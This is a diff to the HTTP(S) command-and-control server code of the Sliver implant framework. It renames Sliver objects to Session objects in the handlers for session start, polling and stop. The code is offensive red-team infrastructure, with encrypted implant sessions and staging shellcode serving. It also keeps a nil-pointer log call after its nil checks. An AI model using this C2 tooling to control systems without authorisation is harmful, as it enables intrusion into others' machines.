@@ -63,7 +63,7 @@ const (
 // HTTPSession - Holds data related to a sliver c2 session
 type HTTPSession struct {
 	ID      string
-	Sliver  *core.Sliver
+	Session *core.Session
 	Key     cryptography.AESKey
 	Started time.Time
 	replay  map[string]bool // Sessions are mutex'd
@@ -84,27 +84,31 @@ func (s *HTTPSession) isReplayAttack(ciphertext []byte) bool {
 	return false
 }
 
-type httpSessions struct {
-	sessions *map[string]*HTTPSession
-	mutex    *sync.RWMutex
+// HTTPSessions - All currently open HTTP sessions
+type HTTPSessions struct {
+	active *map[string]*HTTPSession
+	mutex  *sync.RWMutex
 }
 
-func (s *httpSessions) Add(session *HTTPSession) {
+// Add - Add an HTTP session
+func (s *HTTPSessions) Add(session *HTTPSession) {
 	s.mutex.Lock()
 	defer s.mutex.Unlock()
-	(*s.sessions)[session.ID] = session
+	(*s.active)[session.ID] = session
 }
 
-func (s *httpSessions) Get(sessionID string) *HTTPSession {
+// Get - Get an HTTP session
+func (s *HTTPSessions) Get(sessionID string) *HTTPSession {
 	s.mutex.RLock()
 	defer s.mutex.RUnlock()
-	return (*s.sessions)[sessionID]
+	return (*s.active)[sessionID]
 }
 
-func (s *httpSessions) Remove(sessionID string) {
+// Remove - Remove an HTTP session
+func (s *HTTPSessions) Remove(sessionID string) {
 	s.mutex.Lock()
 	defer s.mutex.Unlock()
-	delete((*s.sessions), sessionID)
+	delete((*s.active), sessionID)
 }
 
 // HTTPHandler - Path mapped to a handler function
@@ -126,7 +130,7 @@ type HTTPServerConfig struct {
 type SliverHTTPC2 struct {
 	HTTPServer      *http.Server
 	Conf            *HTTPServerConfig
-	Sessions        *httpSessions
+	HTTPSessions    *HTTPSessions
 	SliverShellcode []byte // Sliver shellcode to serve during staging process
 	Cleanup         func()
 }
@@ -138,9 +142,9 @@ func StartHTTPSListener(conf *HTTPServerConfig) (*SliverHTTPC2, error) {
 	httpLog.Infof("Starting https listener on '%s'", conf.Addr)
 	server := &SliverHTTPC2{
 		Conf: conf,
-		Sessions: &httpSessions{
-			sessions: &map[string]*HTTPSession{},
-			mutex:    &sync.RWMutex{},
+		HTTPSessions: &HTTPSessions{
+			active: &map[string]*HTTPSession{},
+			mutex:  &sync.RWMutex{},
 		},
 	}
 	server.HTTPServer = &http.Server{
@@ -353,22 +357,22 @@ func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.R
 	sessionInit := &sliverpb.HTTPSessionInit{}
 	proto.Unmarshal(sessionInitData, sessionInit)
 
-	session := newSession()
-	session.Key, _ = cryptography.AESKeyFromBytes(sessionInit.Key)
+	httpSession := newHTTPSession()
+	httpSession.Key, _ = cryptography.AESKeyFromBytes(sessionInit.Key)
 	checkin := time.Now()
-	session.Sliver = &core.Sliver{
-		ID:            core.GetHiveID(),
+	httpSession.Session = core.Sessions.Add(&core.Session{
+		ID:            core.NextSessionID(),
 		Transport:     "http(s)",
 		RemoteAddress: req.RemoteAddr,
 		Send:          make(chan *sliverpb.Envelope, 16),
 		RespMutex:     &sync.RWMutex{},
 		Resp:          map[uint64]chan *sliverpb.Envelope{},
 		LastCheckin:   &checkin,
-	}
-	s.Sessions.Add(session)
-	httpLog.Infof("Started new session with id %s", session.ID)
+	})
+	s.HTTPSessions.Add(httpSession)
+	httpLog.Infof("Started new session with http session id: %s", httpSession.ID)
 
-	data, err := cryptography.GCMEncrypt(session.Key, []byte(session.ID))
+	data, err := cryptography.GCMEncrypt(httpSession.Key, []byte(httpSession.ID))
 	if err != nil {
 		httpLog.Info("Failed to encrypt session identifier")
 		resp.WriteHeader(404)
@@ -377,7 +381,7 @@ func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.R
 	http.SetCookie(resp, &http.Cookie{
 		Domain:   s.Conf.Domain,
 		Name:     sessionCookieName,
-		Value:    session.ID,
+		Value:    httpSession.ID,
 		Secure:   true,
 		HttpOnly: true,
 	})
@@ -386,20 +390,20 @@ func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.R
 
 func (s *SliverHTTPC2) sessionHandler(resp http.ResponseWriter, req *http.Request) {
 
-	session := s.getSession(req)
-	if session == nil {
-		httpLog.Infof("No session with id %#v", session.ID)
+	httpSession := s.getHTTPSession(req)
+	if httpSession == nil {
+		httpLog.Infof("No session with id %#v", httpSession.ID)
 		resp.WriteHeader(403)
 		return
 	}
 
 	data, _ := ioutil.ReadAll(req.Body)
-	if session.isReplayAttack(data) {
+	if httpSession.isReplayAttack(data) {
 		httpLog.Warn("Replay attack detected")
 		resp.WriteHeader(404)
 		return
 	}
-	body, err := cryptography.GCMDecrypt(session.Key, data)
+	body, err := cryptography.GCMDecrypt(httpSession.Key, data)
 	if err != nil {
 		httpLog.Warnf("GCM decryption failed %v", err)
 		resp.WriteHeader(404)
@@ -410,31 +414,31 @@ func (s *SliverHTTPC2) sessionHandler(resp http.ResponseWriter, req *http.Reques
 
 	handlers := sliverHandlers.GetSliverHandlers()
 	if envelope.ID != 0 {
-		session.Sliver.RespMutex.RLock()
-		defer session.Sliver.RespMutex.RUnlock()
-		if resp, ok := session.Sliver.Resp[envelope.ID]; ok {
+		httpSession.Session.RespMutex.RLock()
+		defer httpSession.Session.RespMutex.RUnlock()
+		if resp, ok := httpSession.Session.Resp[envelope.ID]; ok {
 			resp <- envelope
 		}
 	} else if handler, ok := handlers[envelope.Type]; ok {
-		handler.(func(*core.Sliver, []byte))(session.Sliver, envelope.Data)
+		handler.(func(*core.Session, []byte))(httpSession.Session, envelope.Data)
 	}
 	resp.WriteHeader(200)
 	// TODO: Return random data?
 }
 
 func (s *SliverHTTPC2) pollHandler(resp http.ResponseWriter, req *http.Request) {
-	session := s.getSession(req)
-	if session == nil {
-		httpLog.Infof("No session with id %#v", session.ID)
+	httpSession := s.getHTTPSession(req)
+	if httpSession == nil {
+		httpLog.Infof("No session with id %#v", httpSession.ID)
 		resp.WriteHeader(403)
 		return
 	}
 
 	select {
-	case envelope := <-session.Sliver.Send:
+	case envelope := <-httpSession.Session.Send:
 		resp.WriteHeader(200)
 		envelopeData, _ := proto.Marshal(envelope)
-		data, _ := cryptography.GCMEncrypt(session.Key, envelopeData)
+		data, _ := cryptography.GCMEncrypt(httpSession.Key, envelopeData)
 		resp.Write(data)
 	case <-time.After(pollTimeout):
 		httpLog.Info("Poll time out")
@@ -444,33 +448,32 @@ func (s *SliverHTTPC2) pollHandler(resp http.ResponseWriter, req *http.Request) 
 }
 
 func (s *SliverHTTPC2) stopHandler(resp http.ResponseWriter, req *http.Request) {
-	session := s.getSession(req)
-	if session == nil {
-		httpLog.Infof("No session with id %#v", session.ID)
+	httpSession := s.getHTTPSession(req)
+	if httpSession == nil {
+		httpLog.Infof("No session with id %#v", httpSession.ID)
 		resp.WriteHeader(403)
 		return
 	}
 
 	nonce := []byte(req.URL.Query().Get("nonce"))
-	if session.isReplayAttack(nonce) {
+	if httpSession.isReplayAttack(nonce) {
 		httpLog.Warn("Replay attack detected")
 		resp.WriteHeader(404)
 		return
 	}
-	_, err := cryptography.GCMDecrypt(session.Key, nonce)
+	_, err := cryptography.GCMDecrypt(httpSession.Key, nonce)
 	if err != nil {
 		httpLog.Warnf("GCM decryption failed %v", err)
 		resp.WriteHeader(404)
 		return
 	}
 
-	core.Hive.RemoveSliver(session.Sliver)
+	core.Sessions.Remove(httpSession.Session.ID)
 	core.EventBroker.Publish(core.Event{
 		EventType: consts.DisconnectedEvent,
-		Sliver:    session.Sliver,
+		Session:   httpSession.Session,
 	})
-	s.Sessions.Remove(session.ID)
-
+	s.HTTPSessions.Remove(httpSession.ID)
 	resp.WriteHeader(200)
 }
 
@@ -482,14 +485,14 @@ func (s *SliverHTTPC2) eggHandler(resp http.ResponseWriter, req *http.Request) {
 	resp.WriteHeader(200)
 }
 
-func (s *SliverHTTPC2) getSession(req *http.Request) *HTTPSession {
+func (s *SliverHTTPC2) getHTTPSession(req *http.Request) *HTTPSession {
 	for _, cookie := range req.Cookies() {
 		if cookie.Name == sessionCookieName {
-			session := s.Sessions.Get(cookie.Value)
-			if session != nil {
+			httpSession := s.HTTPSessions.Get(cookie.Value)
+			if httpSession != nil {
 				checkin := time.Now()
-				session.Sliver.LastCheckin = &checkin
-				return session
+				httpSession.Session.LastCheckin = &checkin
+				return httpSession
 			}
 			return nil
 		}
@@ -497,7 +500,7 @@ func (s *SliverHTTPC2) getSession(req *http.Request) *HTTPSession {
 	return nil // No valid cookie names
 }
 
-func newSession() *HTTPSession {
+func newHTTPSession() *HTTPSession {
 	return &HTTPSession{
 		ID:      newHTTPSessionID(),
 		Started: time.Now(),
